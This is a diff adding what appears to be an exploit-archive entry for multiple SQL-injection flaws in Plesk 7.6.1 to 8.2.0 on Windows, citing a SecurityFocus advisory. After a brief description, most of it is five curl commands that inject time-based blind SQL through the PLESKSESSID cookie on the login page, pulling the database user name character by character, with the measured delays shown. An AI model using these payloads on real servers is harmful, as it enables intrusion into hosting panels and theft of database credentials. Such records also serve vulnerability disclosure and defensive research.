@@ -1,0 +1,37 @@
+source: http://www.securityfocus.com/bid/25646/info
+
+Plesk is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in SQL queries.
+
+Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Plesk 7.6.1, 8.1.0, 8.1.1, and 8.2.0 for Microsoft Windows are vulnerable; other versions running on different platforms may also be affected. 
+
+1) Delay=5224.3877
+Curl.exe -k "https://www.???.com:8443/login.php3" --cookie
+"PLESKSESSID=1' union select if
+(substring(user,1,1)=char(97),BENCHMARK(3000000,MD5(CHAR(1))),null),2,3
+from mysql.user/*"
+
+2) Delay=5165.3031
+Curl.exe -k "https://www.???.com:8443/login.php3" --cookie
+"PLESKSESSID=1' union select if
+(substring(user,2,1)=char(100),BENCHMARK(3000000,MD5(CHAR(1))),null),2,3
+from mysql.user/*"
+
+3) Delay=5158.9512
+Curl.exe -k "https://www.???.com:8443/login.php3" --cookie
+"PLESKSESSID=1' union select if
+(substring(user,3,1)=char(109),BENCHMARK(3000000,MD5(CHAR(1))),null),2,3
+from mysql.user/*"
+
+4) Delay=5224.0980
+Curl.exe -k "https://www.???.com:8443/login.php3" --cookie
+"PLESKSESSID=1' union select if
+(substring(user,4,1)=char(105),BENCHMARK(3000000,MD5(CHAR(1))),null),2,3
+from mysql.user/*"
+
+5) Delay=5241.5251
+Curl.exe -k "https://www.???.com:8443/login.php3" --cookie
+"PLESKSESSID=1' union select if
+(substring(user,5,1)=char(110),BENCHMARK(3000000,MD5(CHAR(1))),null),2,3
+from mysql.user/*"
